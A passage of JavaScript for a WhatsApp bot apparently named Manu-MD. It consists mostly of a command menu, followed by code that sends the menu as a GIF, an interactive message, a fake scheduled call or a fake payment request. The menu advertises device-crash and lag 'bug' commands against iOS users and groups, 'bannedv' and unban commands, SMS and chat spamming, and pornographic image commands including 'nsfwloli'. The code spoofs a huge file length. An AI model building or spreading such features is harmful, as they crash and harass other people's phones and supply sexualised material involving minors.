 │ ィ•  ${prefix}⛅jiso
 │ ィ•  ${prefix}⛅justina
 │ ィ•  ${prefix}⛅kaga
 │ ィ•  ${prefix}⛅kagura
 │ ィ•  ${prefix}⛅kakasih
 │ ィ•  ${prefix}⛅kaori
 │ ィ•  ${prefix}⛅cartoon
 │ ィ•  ${prefix}⛅shortquote
 │ ィ•  ${prefix}⛅keneki  
 │ ィ•  ${prefix}⛅kotori  
 │ ィ•  ${prefix}⛅kurumi  
 │ ィ•  ${prefix}⛅lisa  
 │ ィ•  ${prefix}⛅madara  
 │ ィ•  ${prefix}⛅megumin  
 │ ィ•  ${prefix}⛅mikasa  
 │ ィ•  ${prefix}⛅mikey  
 │ ィ•  ${prefix}⛅miku  
 │ ィ•  ${prefix}⛅minato  
 │ ィ•  ${prefix}⛅mountain  
 │ ィ•  ${prefix}⛅naruto  
 │ ィ•  ${prefix}⛅neko2  
 │ ィ•  ${prefix}⛅nekonime 
 │ ィ•  ${prefix}⛅nezuko
 │ ィ•  ${prefix}⛅onepiece  
 │ ィ•  ${prefix}⛅pentol  
 │ ィ•  ${prefix}⛅pokemon  
 │ ィ•  ${prefix}⛅programming   
 │ ィ•  ${prefix}⛅randomnime  
 │ ィ•  ${prefix}⛅randomnime2  
 │ ィ•  ${prefix}⛅rize  
 │ ィ•  ${prefix}⛅rose  
 │ ィ•  ${prefix}⛅sagiri  
 │ ィ•  ${prefix}⛅sakura  
 │ ィ•  ${prefix}⛅ sasuke  
 │ ィ•  ${prefix}⛅satanic  
 │ ィ•  ${prefix}⛅shina    
 │ ィ•  ${prefix}⛅shinka  
 │ ィ•  ${prefix}⛅shinomiya 
 │ ィ•  ${prefix}⛅shizuka  
 │ ィ•  ${prefix}⛅shota  
 │ ィ•  ${prefix}⛅space  
 │ ィ•  ${prefix}⛅technology  
 │ ィ•  ${prefix}⛅tejina  
 │ ィ•  ${prefix}⛅toukachan  
 │ ィ•  ${prefix}⛅tsunade  
 │ ィ•  ${prefix}⛅yotsuba  
 │ ィ•  ${prefix}⛅yuki  
 │ ィ•  ${prefix}⛅yulibocil 
 │ ィ•  ${prefix}⛅yumeko
 │ 
 
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＫＥＲＡＮＧ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️apakah
 │ ィ•  ${prefix}🌥️siapakah
 │ ィ•  ${prefix}🌥️benarkah
 │ ィ•  ${prefix}🌥️kapankah
 │ ィ•  ${prefix}🌥️bisakah
 │ ィ•  ${prefix}🌥️haruskah
 │ ィ•  ${prefix}🌥️cekganteng
 │ ィ•  ${prefix}🌥️cekcantik
 │ ィ•  ${prefix}🌥️cekgay
 │ ィ•  ${prefix}🌥️ceklesby
 │ ィ•  ${prefix}🌥️cekkontol
 │ ィ•  ${prefix}🌥️cekmemek
 │ ィ•  ${prefix}🌥️cekhobby
 ╵
 
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＰＡＮＥＬ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️1gb
 │ ィ•  ${prefix}🌥️2gb
 │ ィ•  ${prefix}🌥️3gb
 │ ィ•  ${prefix}🌥️4gb
 │ ィ•  ${prefix}🌥️5gb
 │ ィ•  ${prefix}🌥️6gb
 │ ィ•  ${prefix}🌥️7gb
 │ ィ•  ${prefix}🌥️8gb
 │ ィ•  ${prefix}🌥️9gb
 │ ィ•  ${prefix}🌥️10gb
 │ ィ•  ${prefix}🌥️unli
 │ ィ•  ${prefix}🌥️crateadmin
 │ ィ•  ${prefix}🌥️listusr
 │ ィ•  ${prefix}🌥️listsrv
 │ ィ•  ${prefix}🌥️delusr
 │ ィ•  ${prefix}🌥️delsrv
 ╵
 
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＢＡＮ  &  ＵＮＢＡＮ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️bannedv1
 │ ィ•  ${prefix}🌥️bannedv2
 │ ィ•  ${prefix}🌥️bannedv3
 │ ィ•  ${prefix}🌥️bannedv4
 │ ィ•  ${prefix}🌥️bannedv5
 │ ィ•  ${prefix}🌥️bannedv6
 │ ィ•  ${prefix}🌥️bannedv7
 │ ィ•  ${prefix}🌥️unbannedv1
 │ ィ•  ${prefix}🌥️unbannedv2
 │ ィ•  ${prefix}🌥️unbannedv3
 │ ィ•  ${prefix}🌥️unbannedv4
 │ ィ•  ${prefix}🌥️unbannedv5
 ╵
 
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＢＵＧ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️iosgoogle
 │ ィ•  ${prefix}🌥️iosgoogle2
 │ ィ•  ${prefix}🌥️xioscrash
 │ ィ•  ${prefix}🌥️xioscrash2
 │ ィ•  ${prefix}🌥️xcrash
 │ ィ•  ${prefix}🌥️xcrash2
 │ ィ•  ${prefix}🌥️delaybug
 │ ィ•  ${prefix}🌥️pmbug
 │ ィ•  ${prefix}🌥️amountbug
 │ ィ•  ${prefix}🌥️docubug
 │ ィ•  ${prefix}🌥️unlimitedbug
 │ ィ•  ${prefix}🌥️bombug
 │ ィ•  ${prefix}🌥️lagbug
 │ ィ•  ${prefix}🌥️trollybug
 │ ィ•  ${prefix}🌥️gcbug
 │ ィ•  ${prefix}🌥️laggcbug
 │ ィ•  ${prefix}🌥️bomgcbug
 │ ィ•  ${prefix}🌥️delaygcbug
 │ ィ•  ${prefix}🌥️docugcbug
 │ ィ•  ${prefix}🌥️unlimitedgcbug
 │ ィ•  ${prefix}🌥️trollygcbug
 ╵
 
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＮＳＦＷ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️nsfw *on/off*
 │ ィ•  ${prefix}🌥️hentaivid
 │ ィ•  ${prefix}🌥️hneko
 │ ィ•  ${prefix}🌥️hentai1
 │ ィ•  ${prefix}🌥️trap
 │ ィ•  ${prefix}🌥️nwaifu
 │ ィ•  ${prefix}🌥️gasm
 │ ィ•  ${prefix}🌥️milf
 │ ィ•  ${prefix}🌥️animespank
 │ ィ•  ${prefix}🌥️ahegao
 │ ィ•  ${prefix}🌥️bdsm
 │ ィ•  ${prefix}🌥️blowjob
 │ ィ•  ${prefix}🌥️cuckold
 │ ィ•  ${prefix}🌥️cum
 │ ィ•  ${prefix}🌥️eba
 │ ィ•  ${prefix}🌥️ero
 │ ィ•  ${prefix}🌥️femdom
 │ ィ•  ${prefix}🌥️foot
 │ ィ•  ${prefix}🌥️gangbang
 │ ィ•  ${prefix}🌥️glasses
 │ ィ•  ${prefix}🌥️manga
 │ ィ•  ${prefix}🌥️jahy
 │ ィ•  ${prefix}🌥️masturbation
 │ ィ•  ${prefix}🌥️hneko1
 │ ィ•  ${prefix}🌥️hneko2
 │ ィ•  ${prefix}🌥️nsfwloli
 │ ィ•  ${prefix}🌥️gifs
 │ ィ•  ${prefix}🌥️orgy
 │ ィ•  ${prefix}🌥️panties
 │ ィ•  ${prefix}🌥️gifhentai
 │ ィ•  ${prefix}🌥️pussy
 │ ィ•  ${prefix}🌥️tentacles
 │ ィ•  ${prefix}🌥️thighs
 │ ィ•  ${prefix}🌥️zettai
 │ ィ•  ${prefix}🌥️yuri
 │ ィ•  ${prefix}🌥️gifblowjob
 ╵
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＮＳＦＷ  N E W_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️genshin
 │ ィ•  ${prefix}🌥️swimsuit
 │ ィ•  ${prefix}🌥️schoolswimsuit
 │ ィ•  ${prefix}🌥️white
 │ ィ•  ${prefix}🌥️barefoot
 │ ィ•  ${prefix}🌥️touhou
 │ ィ•  ${prefix}🌥️gamecg
 │ ィ•  ${prefix}🌥️hololive
 │ ィ•  ${prefix}🌥️uncensored
 │ ィ•  ${prefix}🌥️sungglasses
 │ ィ•  ${prefix}🌥️chain
 │ ィ•  ${prefix}🌥️shirtlift
 │ ィ•  ${prefix}🌥️weapon
 │ ィ•  ${prefix}🌥️glasses
 │ ィ•  ${prefix}🌥️fingering
 │ ィ•  ${prefix}🌥️flatchest
 │ ィ•  ${prefix}🌥️torncloth
 │ ィ•  ${prefix}🌥️bondage
 │ ィ•  ${prefix}🌥️demon
 │ ィ•  ${prefix}🌥️pantypull
 │ ィ•  ${prefix}🌥️headdress
 │ ィ•  ${prefix}🌥️headphone
 │ ィ•  ${prefix}🌥️anusview
 │ ィ•  ${prefix}🌥️shorts
 │ ィ•  ${prefix}🌥️stokings
 │ ィ•  ${prefix}🌥️topless
 │ ィ•  ${prefix}🌥️beach
 │ ィ•  ${prefix}🌥️bunnygirl
 │ ィ•  ${prefix}🌥️bunnyear
 │ ィ•  ${prefix}🌥️vampire
 │ ィ•  ${prefix}🌥️nobra
 │ ィ•  ${prefix}🌥️bikini
 │ ィ•  ${prefix}🌥️whitehair
 │ ィ•  ${prefix}🌥️blonde
 │ ィ•  ${prefix}🌥️pinkhair
 │ ィ•  ${prefix}🌥️bed
 │ ィ•  ${prefix}🌥️ponytail
 │ ィ•  ${prefix}🌥️nude
 │ ィ•  ${prefix}🌥️dress
 │ ィ•  ${prefix}🌥️underwear
 │ ィ•  ${prefix}🌥️foxgirl
 │ ィ•  ${prefix}🌥️uniform
 │ ィ•  ${prefix}🌥️skirt
 │ ィ•  ${prefix}🌥️breast
 │ ィ•  ${prefix}🌥️twintail
 │ ィ•  ${prefix}🌥️spreadpussy
 │ ィ•  ${prefix}🌥️seethrough
 │ ィ•  ${prefix}🌥️breasthold
 │ ィ•  ${prefix}🌥️fateseries
 │ ィ•  ${prefix}🌥️spreadlegs
 │ ィ•  ${prefix}🌥️openshirt
 │ ィ•  ${prefix}🌥️headband
 │ ィ•  ${prefix}🌥️nipples
 │ ィ•  ${prefix}🌥️erectnipples
 │ ィ•  ${prefix}🌥️greenhair
 │ ィ•  ${prefix}🌥️wolfgirl
 │ ィ•  ${prefix}🌥️catgirl
 ╵
 
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＯＴＨＥＲ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️sewa
 │ ィ•  ${prefix}🌥️sewabot
 │ ィ•  ${prefix}🌥️credit
 │ ィ•  ${prefix}🌥️script
 │ ィ•  ${prefix}🌥️stickerwm
 │ ィ•  ${prefix}🌥️swm
 │ ィ•  ${prefix}🌥️stickergifwm
 │ ィ•  ${prefix}🌥️sgifwm
 │ ィ•  ${prefix}🌥️wm
 │ ィ•  ${prefix}🌥️sticker
 │ ィ•  ${prefix}🌥️smeme
 │ ィ•  ${prefix}🌥️smeta
 │ ィ•  ${prefix}🌥️jarak
 │ ィ•  ${prefix}🌥️qc
 │ ィ•  ${prefix}🌥️qcimg
 │ ィ•  ${prefix}🌥️emojimix
 │ ィ•  ${prefix}🌥️attp
 │ ィ•  ${prefix}🌥️readvo
 │ ィ•  ${prefix}🌥️ppcp
 │ ィ•  ${prefix}🌥️nulis
 │ ィ•  ${prefix}🌥️ssweb
 │ ィ•  ${prefix}🌥️shinobu
 │ ィ•  ${prefix}🌥️wallnime
 │ ィ•  ${prefix}🌥️pantun
 │ ィ•  ${prefix}🌥️meme
 │ ィ•  ${prefix}🌥️artinama
 │ ィ•  ${prefix}🌥️artimimpi
 │ ィ•  ${prefix}🌥️infocuaca
 │ ィ•  ${prefix}🌥️infogempa
 │ ィ•  ${prefix}🌥️jadwaltv
 │ ィ•  ${prefix}🌥️jadwaltvnow
 │ ィ•  ${prefix}🌥️torvo
 │ ィ•  ${prefix}🌥️ceritahoror
 │ ィ•  ${prefix}🌥️request
 │ ィ•  ${prefix}🌥️report
 │ ィ•  ${prefix}🌥️getkontak
 │ ィ•  ${prefix}🌥️getmusic
 │ ィ•  ${prefix}🌥️getvideo
 │ ィ•  ${prefix}🌥️wmvideo
 │ ィ•  ${prefix}🌥️profil
 │ ィ•  ${prefix}🌥️cuaca5
 │ ィ•  ${prefix}🌥️covidinfo
 │ ィ•  ${prefix}🌥️blurimg
 │ ィ•  ${prefix}🌥️wallml
 │ ィ•  ${prefix}🌥️ulzzanggirl
 │ ィ•  ${prefix}🌥️ulzzangboy
 │ ィ•  ${prefix}🌥️ryujin
 │ ィ•  ${prefix}🌥️rose
 │ ィ•  ${prefix}🌥️pubg
 │ ィ•  ${prefix}🌥️profilepic
 │ ィ•  ${prefix}🌥️couplepic
 │ ィ•  ${prefix}🌥️car
 │ ィ•  ${prefix}🌥️notnot
 │ ィ•  ${prefix}🌥️kpop
 │ ィ•  ${prefix}🌥️kayes
 │ ィ•  ${prefix}🌥️justina
 │ ィ•  ${prefix}🌥️doggo
 ╵
 
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＧＲＯＵＰ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️intro
 │ ィ•  ${prefix}🌥️buka
 │ ィ•  ${prefix}🌥️tutup
 │ ィ•  ${prefix}🌥️autodl
 │ ィ•  ${prefix}🌥️setppgc
 │ ィ•  ${prefix}🌥️setppgcful
 │ ィ•  ${prefix}🌥️setppgc1
 │ ィ•  ${prefix}🌥️delppgc
 │ ィ•  ${prefix}🌥️setdesc
 │ ィ•  ${prefix}🌥️setnamegc
 │ ィ•  ${prefix}🌥️prank
 │ ィ•  ${prefix}??️opentime
 │ ィ•  ${prefix}🌥️closetime
 │ ィ•  ${prefix}🌥️getidgc
 │ ィ•  ${prefix}🌥️cekmember
 │ ィ•  ${prefix}🌥️polling
 │ ィ•  ${prefix}🌥️jodohku
 │ ィ•  ${prefix}🌥️listonline
 │ ィ•  ${prefix}🌥️call
 │ ィ•  ${prefix}🌥️afk
 │ ィ•  ${prefix}🌥️add
 │ ィ•  ${prefix}🌥️kick
 │ ィ•  ${prefix}🌥️linkgc
 │ ィ•  ${prefix}🌥️delete
 │ ィ•  ${prefix}🌥️delete1
 │ ィ•  ${prefix}🌥️promote
 │ ィ•  ${prefix}🌥️demote
 │ ィ•  ${prefix}🌥️promoteall
 │ ィ•  ${prefix}🌥️demoteall
 │ ィ•  ${prefix}🌥️revoke
 │ ィ•  ${prefix}🌥️delete2
 │ ィ•  ${prefix}🌥️setleft
 │ ィ•  ${prefix}🌥️changeleft
 │ ィ•  ${prefix}🌥️delsetleft
 │ ィ•  ${prefix}🌥️antilink
 │ ィ•  ${prefix}🌥️antifoto
 │ ィ•  ${prefix}🌥️antipromo
 │ ィ•  ${prefix}🌥️antitoxic
 │ ィ•  ${prefix}🌥️antiwame
 │ ィ•  ${prefix}🌥️antilinkfb
 │ ィ•  ${prefix}🌥️antilinkig
 │ ィ•  ${prefix}🌥️antilinktele
 │ ィ•  ${prefix}🌥️antilinkytch
 │ ィ•  ${prefix}🌥️antilinkytvid
 │ ィ•  ${prefix}🌥️antilinktt
 │ ィ•  ${prefix}🌥️antilinkxxnx
 │ ィ•  ${prefix}🌥️autosticker
 │ ィ•  ${prefix}🌥️autodlgc
 │ ィ•  ${prefix}🌥️antilinkall
 │ ィ•  ${prefix}🌥️antilinktwt
 │ ィ•  ${prefix}🌥️antilinksfile
 │ ィ•  ${prefix}🌥️antilinkdc
 │ ィ•  ${prefix}🌥️antidoc
 │ ィ•  ${prefix}🌥️antiloc
 │ ィ•  ${prefix}🌥️anticon
 │ ィ•  ${prefix}🌥️antidelete
 │ ィ•  ${prefix}🌥️antivo
 │ ィ•  ${prefix}🌥️antivideo
 │ ィ•  ${prefix}🌥️antiaudio
 │ ィ•  ${prefix}🌥️antiteks
 │ ィ•  ${prefix}🌥️antivirtex
 │ ィ•  ${prefix}🌥️myrespon
 │ ィ•  ${prefix}🌥️hidetag
 │ ィ•  ${prefix}🌥️totag
 │ ィ•  ${prefix}🌥️userjid
 │ ィ•  ${prefix}🌥️getppgc
 │ ィ•  ${prefix}🌥️getpp
 │ ィ•  ${prefix}🌥️getnamegc
 │ ィ•  ${prefix}🌥️getdesc
 │ ィ•  ${prefix}🌥️infogc
 │ ィ•  ${prefix}🌥️getname
 │ ィ•  ${prefix}🌥️welcome
 │ ィ•  ${prefix}🌥️goodbye
 │ ィ•  ${prefix}🌥️setwelcome
 │ ィ•  ${prefix}🌥️delsetwelcome
 │ ィ•  ${prefix}🌥️changewelcome
 │ ィ•  ${prefix}🌥️getname1
 │ ィ•  ${prefix}🌥️bcgc
 │ ィ•  ${prefix}🌥️tagadmin
 │ ィ•  ${prefix}🌥️invite
 │ ィ•  ${prefix}🌥️whocecan
 │ ィ•  ${prefix}🌥️whocogan
 │ ィ•  ${prefix}🌥️jodoh
 │ ィ•  ${prefix}🌥️jadian
 │ ィ•  ${prefix}🌥️anaksukses
 │ ィ•  ${prefix}🌥️gay
 │ ィ•  ${prefix}🌥️grup *open/close*
 ╵
 
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＯＷＮＥＲ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}⛅spamsms
 │ ィ•  ${prefix}🌥️listgc
 │ ィ•  ${prefix}🌥️listpc
 │ ィ•  ${prefix}🌥️getpp
 │ ィ•  ${prefix}🌥️setppbot
 │ ィ•  ${prefix}🌥️setppful
 │ ィ•  ${prefix}🌥️setbiobot
 │ ィ•  ${prefix}🌥️setnamabot
 │ ィ•  ${prefix}🌥️delppbot
 │ ィ•  ${prefix}🌥️setmenu
 │ ィ•  ${prefix}🌥️creategc
 │ ィ•  ${prefix}🌥️join
 │ ィ•  ${prefix}🌥️out 
 │ ィ•  ${prefix}🌥️jpm
 │ ィ•  ${prefix}🌥️addowner
 │ ィ•  ${prefix}🌥️delowner
 │ ィ•  ${prefix}🌥️addprem
 │ ィ•  ${prefix}🌥️delprem
 │ ィ•  ${prefix}🌥️listprem
 │ ィ•  ${prefix}🌥️delsampah
 │ ィ•  ${prefix}🌥️delsampah2 
 │ ィ•  ${prefix}🌥️getcase
 │ ィ•  ${prefix}🌥️resetlimit
 │ ィ•  ${prefix}🌥️myip
 │ ィ•  ${prefix}🌥️mode
 │ ィ•  ${prefix}🌥️onlygc
 │ ィ•  ${prefix}🌥️addlimit
 │ ィ•  ${prefix}🌥️pushcontact
 │ ィ•  ${prefix}🌥️pushcontactv2
 │ ィ•  ${prefix}🌥️verify
 │ ィ•  ${prefix}🌥️banned
 │ ィ•  ${prefix}🌥️kenon
 │ ィ•  ${prefix}🌥️logout
 │ ィ•  ${prefix}🌥️spamchat
 │ ィ•  ${prefix}🌥️block
 │ ィ•  ${prefix}🌥️unblock
 │ ィ•  ${prefix}🌥️listblock
 │ ィ•  ${prefix}🌥️ban
 │ ィ•  ${prefix}🌥️unban
 │ ィ•  ${prefix}🌥️listban
 │ ィ•  ${prefix}🌥️listowner
 │ ィ•  ${prefix}🌥️autoswview
 │ ィ•  ${prefix}🌥️addcase
 │ ィ•  ${prefix}🌥️delcase
 │ ィ•  ${prefix}🌥️bcgc1
 │ ィ•  ${prefix}🌥️bcgc
 │ ィ•  ${prefix}🌥️sendfitur
 │ ィ•  ${prefix}🌥️dashboard
 │ ィ•  ${prefix}🌥️delchat
 │ ィ•  ${prefix}🌥️clearchat
 │ ィ•  ${prefix}🌥️backup
 │ ィ•  ${prefix}🌥️getfunc
 │ ィ•  ${prefix}🌥️gantifile
 │ ィ•  ${prefix}🌥️delfolder
 ╵
 
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＡＳＵＰＡＮ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️tobrut1
 │ ィ•  ${prefix}🌥️tobrut2
 │ ィ•  ${prefix}🌥️tobrut3
 │ ィ•  ${prefix}🌥️tobrut4
 │ ィ•  ${prefix}🌥️tobrut5
 │ ィ•  ${prefix}🌥️tobrut6
 │ ィ•  ${prefix}🌥️bokep
 │ ィ•  ${prefix}🌥️ometv
 │ ィ•  ${prefix}🌥cosplay
 │ ィ•  ${prefix}🌥️douyin
 │ ィ•  ${prefix}🌥picre
 │ ィ•  ${prefix}🌥️danbooru
 │ ィ•  ${prefix}🌥️yandere
 │ ィ•  ${prefix}🌥️cecanindo
 │ ィ•  ${prefix}🌥️cecanchina
 │ ィ•  ${prefix}🌥️hijaber
 │ ィ•  ${prefix}🌥️yuli
 │ ィ•  ${prefix}🌥️paptt
 │ ィ•  ${prefix}🌥️china
 │ ィ•  ${prefix}🌥️hijab
 │ ィ•  ${prefix}🌥️indo
 │ ィ•  ${prefix}🌥️jepang
 │ ィ•  ${prefix}🌥️korea
 │ ィ•  ${prefix}🌥️malaysia
 │ ィ•  ${prefix}🌥️randomgirl
 │ ィ•  ${prefix}🌥️randomboy
 │ ィ•  ${prefix}🌥️thailand
 │ ィ•  ${prefix}🌥️vietnam
 │ ィ•  ${prefix}🌥️tiktokghea
 │ ィ•  ${prefix}🌥️tiktokbocil
 │ ィ•  ${prefix}🌥️tiktokkayes
 │ ィ•  ${prefix}🌥️tiktokpanrika
 │ ィ•  ${prefix}🌥️cosplayangel
 │ ィ•  ${prefix}🌥️videosad
 │ ィ•  ${prefix}🌥️videogalau
 │ ィ•  ${prefix}🌥️wibuvid
 ╵
 
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＡＮＩＭＥ  ＲＡＮＤＯＭ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️akira
 │ ィ•  ${prefix}🌥️gichar
 │ ィ•  ${prefix}🌥️akiyama
 │ ィ•  ${prefix}🌥️ana
 │ ィ•  ${prefix}🌥️asuna
 │ ィ•  ${prefix}🌥️ayuzawa
 │ ィ•  ${prefix}🌥️boruto
 │ ィ•  ${prefix}🌥️chitanda
 │ ィ•  ${prefix}🌥️deidara
 │ ィ•  ${prefix}🌥️elaina
 │ ィ•  ${prefix}🌥️emilia
 │ ィ•  ${prefix}🌥️erza
 │ ィ•  ${prefix}🌥️fanart
 │ ィ•  ${prefix}🌥️genshin
 │ ィ•  ${prefix}🌥️gremory
 │ ィ•  ${prefix}🌥️hestia
 │ ィ•  ${prefix}🌥️hinata
 │ ィ•  ${prefix}🌥️husbu
 │ ィ•  ${prefix}🌥️icon
 │ ィ•  ${prefix}🌥️inori
 │ ィ•  ${prefix}🌥️isuzu
 │ ィ•  ${prefix}🌥️itachi
 │ ィ•  ${prefix}🌥️itori
 │ ィ•  ${prefix}🌥️kaga
 │ ィ•  ${prefix}🌥️kagura
 │ ィ•  ${prefix}🌥️kaguya
 │ ィ•  ${prefix}🌥️kakasih
 │ ィ•  ${prefix}🌥️kaneki
 │ ィ•  ${prefix}🌥️kaori
 │ ィ•  ${prefix}🌥️keneki
 │ ィ•  ${prefix}🌥️kosaki
 │ ィ•  ${prefix}🌥️kotori
 │ ィ•  ${prefix}🌥️kuriyama
 │ ィ•  ${prefix}🌥️kuroha
 │ ィ•  ${prefix}🌥️kurumi
 │ ィ•  ${prefix}🌥️loli
 │ ィ•  ${prefix}🌥️madara
 │ ィ•  ${prefix}🌥️megumin
 │ ィ•  ${prefix}🌥️menus
 │ ィ•  ${prefix}🌥️mikasa
 │ ィ•  ${prefix}🌥️miku
 │ ィ•  ${prefix}🌥️minato
 │ ィ•  ${prefix}🌥️naruto
 │ ィ•  ${prefix}🌥️natsukawa
 │ ィ•  ${prefix}🌥️nezuko
 │ ィ•  ${prefix}🌥️nishimiya
 │ ィ•  ${prefix}🌥️onepiece
 │ ィ•  ${prefix}🌥️pokemon
 │ ィ•  ${prefix}🌥️rem
 │ ィ•  ${prefix}🌥️rize
 │ ィ•  ${prefix}🌥️sagiri
 │ ィ•  ${prefix}🌥️sakura
 │ ィ•  ${prefix}🌥️sasuke
 │ ィ•  ${prefix}🌥️shina
 │ ィ•  ${prefix}🌥️shinka
 │ ィ•  ${prefix}🌥️shizuka
 │ ィ•  ${prefix}🌥️shota
 │ ィ•  ${prefix}🌥️simp
 │ ィ•  ${prefix}🌥️tomori
 │ ィ•  ${prefix}🌥️toukachan
 │ ィ•  ${prefix}🌥️tsunade
 │ ィ•  ${prefix}🌥️yatogami
 │ ィ•  ${prefix}🌥️yuki
 ╵
 
© Script Recode by *Manul~*
• Credit | 𝙈𝘼𝙉𝙐𝙇 | ${tahun}`
if (typeallmenu === 'v1') {
await Al.sendMessage(m.chat, {video: {url: gif}, gifPlayback: true, caption: capt,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`, 
body: `${ucapanWaktu} ᴋᴀᴋ`,
thumbnailUrl: global.thumb,
sourceUrl: global.myweb, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: ftoko1})

} if (typeallmenu === 'v2') {
    let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                    mentionedJid: [m.sender],
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "120363232588171807@newsletter",
                        newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝑾𝒂𝒏 💙',
                        serverMessageId: -1
                    },
                    businessMessageForwardInfo: {
                        businessOwnerJid: Al.decodeJid(Al.user.id)
                    },
                    externalAdReply: {
                        title: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ`,
                        body: `${ucapanWaktu}ᴋᴀᴋ`,
                        thumbnailUrl: global.thumb,
                        sourceUrl: global.myweb,
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                },
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "© 𝐌𝐚𝐧𝐮 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: capt,
                    thumbnailUrl: global.thumb,
                    gifPlayback: true,
                    subtitle: '',
                    hasMediaAttachment: true,
                    ...(await prepareWAMessageMedia({
                        video: fs.readFileSync('./package.json'),
                    mimetype: "video/mp4",
                        fileLength: 999999999999778866,
                        video: fs.readFileSync("./Wann2.mp4"),
                        fileName: "Furina MD"
                     }, {
                        upload: Al.waUploadToServer
                    }))
                }),
                gifPlayback: true,
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                                        "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝙼𝙰𝙽𝚄-𝙼𝙳 💙","id":"${prefix}furina hallo"}`
                },
                {
            "name": "cta_url",
            "buttonParamsJson": "{\"display_text\":\"𝙸𝙽𝙵𝙾 𝙼𝙰𝙽𝚄-𝙼𝙳 💙\",\"url\":\"https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\",\"merchant_url\":\"https://www.google.com\"}"
},
 ],
 })
 })
 }
 }
}, {})
await Al.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
  } else if (typeallmenu === 'v3') {
  await Al.relayMessage(m.chat, {
		scheduledCallCreationMessage: {
		callType: "AUDIO",
		scheduledTimestampMs: 100,
		title: capt, 
		}
	}, {})
	} else if (typeallmenu === 'v4') {
	await Al.relayMessage(m.chat,  {
     requestPaymentMessage: {
           currencyCodeIso4217: 'LKR',
                 amount1000: 999999000,
                       requestFrom: m.sender,
                             noteMessage: {
                                   extendedTextMessage: {
                                         text: capt,
                                               contextInfo: {
                                                     externalAdReply: {
                                                           showAdAttribution: true
                                                                 }}}}}}, {})          
 } else if (typeallmenu === 'v5') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ''
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: '*𝙼𝚊𝚗𝚞-𝙼𝙳 💙*'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: capt,
            subtitle: '',
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": "{\"title\":\"VIEW RULES\",\"sections\":[{\"title\":\"RULES 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭\",\"highlight_label\":\"Rules\",\"rows\":[{\"header\":\"📓 Don't Spam\",\"title\":\"• To not ban\",\"description\":\"And not blocked\",\"id\":\".play\"},{\"header\":\"📘 Don't Call me\",\"title\":\"• Usually happens often\",\"description\":\"Error if on the phone\",\"id\":\".play\"},{\"header\":\"📘 Don't Abduction\",\"title\":\"• You're kidnapping me\",\"description\":\"Ready to ban\",\"id\":\".play\"}]}]}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"CHAT OWNER\",\"url\":\"https://wa.me/+94742274855?text=Halo+Bang\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"MENAMPILKAN TUTORIAL","id":"${prefix}tutorial"}`
